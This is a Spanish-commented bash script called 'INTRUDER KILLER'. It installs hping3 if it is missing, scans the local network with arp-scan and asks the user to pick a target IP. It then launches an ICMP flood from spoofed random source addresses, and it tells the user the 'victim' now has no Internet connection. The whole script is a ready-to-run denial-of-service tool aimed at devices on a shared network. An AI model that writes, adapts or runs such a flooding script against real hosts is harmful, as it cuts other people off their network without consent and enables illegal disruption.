#!/bin/bash

# Imprimimos por pantalla un Banner para nuestra herramienta
echo " ____                          _    _   _____           _"
echo "|  _ \ _   _ ___ ___  ___  ___| | _(_) |_   _|__   ___ | |___"
echo "| |_) | | | / __/ __|/ _ \/ __| |/ / |   | |/ _ \ / _ \| / __|"
echo "|  _ <| |_| \__ \__ \ (_) \__ \   <| |   | | (_) | (_) | \__ \ "
echo "|_| \_\\_____|___/___/\___/|___/_|\_\_|   |_|\___/ \___/|_|___/"
echo
# Con esta numerología concreta le estamos indicando al Script
# que imprima el siguiente mensaje en color Amarillo
echo "########### INTRUDER KILLER ###########"

# Realizamos una comprobación de si el programa Hping3 se encuentra instalado
test -f /usr/sbin/hping3

# En caso de ser así, se informa al usuario de ello
if [ $(echo $?) -eq 0 ]; then
        echo
        echo "-> Los programas necesarios están instalados."
# En caso contrario, se informa también y se procede a instalar Hping3
else
        echo
        echo "-> Faltan programas por instalar, espera un momento.."
        apt update > /dev/null && apt install hping3 -y > /dev/null
        echo "-> Todo listo ahora!"
fi
echo

# Consultamos al usuario la Interfaz a analizar, imprimiendo la consulta
# con -p y con read recogemos lo que se ingrese en la variable interfaz
read -p "Introduce la Interfaz de red que deseas analizar: " interfaz

echo
echo "-> Estas son las direcciones IP conectadas a tu red local:"
echo

# Ejecutamos el comando que se encargará de analizar la Interfaz
# proporcionada en busca de más equipos conectados a la red local
arp-scan -I "$interfaz" --localnet

echo
echo "------------------------------------------------------"

# Ahora, consultamos al usuario por la dirección IP específica a la que
# atacar de entre las que aparecieron disponibles en el análisis previo
read -p "Introduce la dirección IP a la que deseas atacar: " ip
echo

# Informamos al usuario que el ataque se está ejecutando, y que si desea
# detenerlo lo puede hacer con la combinación de teclas Ctrl + C
echo "-> Realizando el ataque!, tu víctima no tiene conexión a Internet ;-)"
echo "*** Presiona Ctrl + C para cancelar el ataque ***"
echo

# Ejecutamos el comando que se encargará de realizar las peticiones
# masivas de diferentes direccions IP al equipo de la víctima, en
# donde la variable ip es la que recoge la dirección proporcionada
hping3 --icmp --rand-source --flood -d 1400 "$ip"